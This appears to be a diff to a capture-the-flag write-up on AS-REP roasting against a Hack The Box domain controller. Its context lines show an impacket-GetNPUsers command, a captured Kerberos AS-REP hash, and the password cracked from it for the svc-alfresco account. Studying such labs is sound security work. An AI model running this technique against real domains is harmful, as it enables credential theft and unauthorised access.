@@ -152,7 +152,7 @@ user:[santi] rid:[0x480]
 
 Knowing all domain users, we can check if someone has kerberos pre authentication disabled.
 
-And we observe that the `svc-alfresco` account doesn't have kerberos pre authentication enabled.
+Using `Impacket-GetNPUsers`, we observe that the `svc-alfresco` account doesn't have kerberos pre authentication enabled.
 
 ```bash
 impacket-GetNPUsers htb.local/ -usersfile users -request
@@ -170,7 +170,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:42e773bee9501251da0035229b24c84d$7cec2490ed
 
 **In this case anyone can send an AS_REQ request to the DC on behalf of svc-alfresco, and receive an AS_REP message. Since part of that message is encrypted using the user’s password, we can attempt to brute-force the user’s password offline.**
 
-Using `Impacket-GetNPUsers` we can request the `Kerberos 5, etype 23, AS-REP` hash of the `svc-alfresco` account and crack it with john.
+With John we are able to crack the `Kerberos 5, etype 23, AS-REP` hash.
 
 `svc-alfresco`:`s3rvice`
 
